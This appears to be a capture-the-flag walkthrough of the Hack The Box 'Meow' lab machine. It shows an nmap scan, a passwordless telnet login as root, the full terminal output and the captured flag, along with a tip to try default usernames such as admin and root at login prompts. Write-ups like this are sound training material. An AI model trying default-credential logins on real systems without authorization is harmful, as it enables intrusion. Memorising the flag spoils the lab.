This box is about "configuration mistakes".

When there's a login box, try:
- admin
- administrator
- root

### Scan
```
┌──(kali㉿kali)-[~/htb/meow]
└─$ nmap 10.129.188.75    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-12 20:06 EST
Nmap scan report for 10.129.188.75
Host is up (0.018s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
23/tcp open  telnet
```
### Try username: root
```
┌──(kali㉿kali)-[~/htb/meow]
└─$ telnet 10.129.188.75        
Trying 10.129.188.75...
Connected to 10.129.188.75.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 13 Mar 2022 01:06:55 AM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             136
  Users logged in:       0
  IPv4 address for eth0: 10.129.188.75
  IPv6 address for eth0: dead:beef::250:56ff:feb9:335b

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~#
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
```